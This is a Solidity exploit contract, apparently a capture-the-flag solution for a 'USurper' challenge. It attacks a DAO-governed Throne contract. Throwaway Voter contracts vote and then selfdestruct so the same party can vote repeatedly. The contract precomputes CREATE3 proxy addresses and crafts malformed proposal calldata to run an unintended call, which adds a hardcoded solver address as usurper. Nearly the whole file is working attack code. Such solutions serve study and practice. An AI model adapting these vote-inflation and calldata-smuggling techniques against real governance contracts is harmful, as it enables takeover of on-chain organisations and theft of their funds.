pragma solidity 0.8.20;

import "src/USurper.sol";
import "forge-std/Test.sol";

contract Voter {
  constructor(address dao, uint256 id) {
    DAO(dao).vote(id);
    selfdestruct(payable(0));
  } 
}

contract Exp {
  bytes32 private constant SLOT_KEY_PREFIX = 0x06fccbac10f612a9037c3e903b4f4bd03ffbc103781cbe821d25b33299e50efb;
  bytes32 internal constant KECCAK256_PROXY_CHILD_BYTECODE = 0x648b59bcbb41c37892d3b820522dc8b8c275316bb020f043a9068f607abeb810;
  address constant solver = 0x87176364A742aa3cd6a41De1A2E910602881AB7d;

  DAO public dao;

  function internalKey(bytes32 _key) internal pure returns (bytes32) {
    return keccak256(abi.encode(SLOT_KEY_PREFIX, _key));
  }

  function addressOf(bytes32 _salt) internal view returns (address, address) {
    address proxy = address(
      uint160(
        uint256(
          keccak256(
            abi.encodePacked(
              hex'ff',
              address(dao),
              _salt,
              KECCAK256_PROXY_CHILD_BYTECODE
            )
          )
        )
      )
    );

    return (proxy, address(
      uint160(
        uint256(
          keccak256(
            abi.encodePacked(
              hex"d6_94",
              proxy,
              hex"01"
            )
          )
        )
      )
    ));
  }

  function creationCodeFor(bytes memory _code) internal pure returns (bytes memory) {
    return abi.encodePacked(
      hex"63",
      uint32(_code.length),
      hex"80_60_0E_60_00_39_60_00_F3",
      _code
    );
  }

  function run(address _throne) public {
    Throne throne = Throne(_throne);
    dao = throne.dao();

    uint256 thronesValue = uint256(keccak256(abi.encode(solver)));


    uint256 id = 0xfffffffffffff;
    dao.createProposal(
      id,
      address(throne),
      abi.encodeCall(Throne.forgeThrone, (thronesValue)),
      ""
    );

    new Voter(address(dao), id);
    new Voter(address(dao), id);

    dao.execute(id);

    id = uint256(keccak256(abi.encode(6543210, 6543210)));
    dao.createProposal(
      id,
      address(throne),
      abi.encodePacked(Throne.forgeThrone.selector, hex"0000000000000000000000ff"),
      ""
    );

    new Voter(address(dao), id);
    new Voter(address(dao), id);

    (, address target) = addressOf(internalKey(bytes32(id)));
    require(target.code.length > 0, "Wrong target");
    // console.logBytes(target.code);
    target.call("");
  }

  function run2(address _throne) public {
    uint256 id = uint256(keccak256(abi.encode(6543210, 6543210)));
    uint256 id2 = 6543210;
    (address proxy, ) = addressOf(internalKey(bytes32(id)));
    // console.log("Proxy = ", proxy);

    bytes memory cd = abi.encodeCall(Throne.addUsurper, (solver));

    dao.createProposal(
      id2,
      address(_throne),
      abi.encodePacked(Throne.forgeThrone.selector),
      string(cd)
    );

    // proxy.call(code);

    dao.execute(id);

    uint256 thronesValue = uint256(keccak256(abi.encode(solver)));
    require(Throne(_throne).verify(uint256(uint160(solver)), thronesValue), "Not pass");
  }
}
